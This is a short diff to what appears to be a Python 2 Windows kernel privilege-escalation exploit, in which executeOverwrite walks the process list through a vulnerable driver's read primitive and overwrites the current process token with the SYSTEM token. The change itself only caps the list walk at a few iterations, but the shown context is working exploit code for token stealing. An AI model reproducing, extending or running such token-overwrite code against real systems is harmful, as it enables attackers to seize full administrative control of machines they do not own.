@@ -376,7 +376,13 @@ def executeOverwrite():
         
         process_base_pointer = system_process_base_pointer
 
+        counter = 0
+
         while True:
+
+            if counter > 5:
+                break
+            counter+=1
 
             flink = readPrimitive(driver, process_base_pointer + PROC_FLINK_OFFSET, user_addr)
             if flink == system_process_base_pointer:
@@ -387,6 +393,7 @@ def executeOverwrite():
             print "Process Base Pointer", type(process_base_pointer), hex(process_base_pointer)
 
             current_token = process_base_pointer + TOKEN_OFFSET
+
 
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
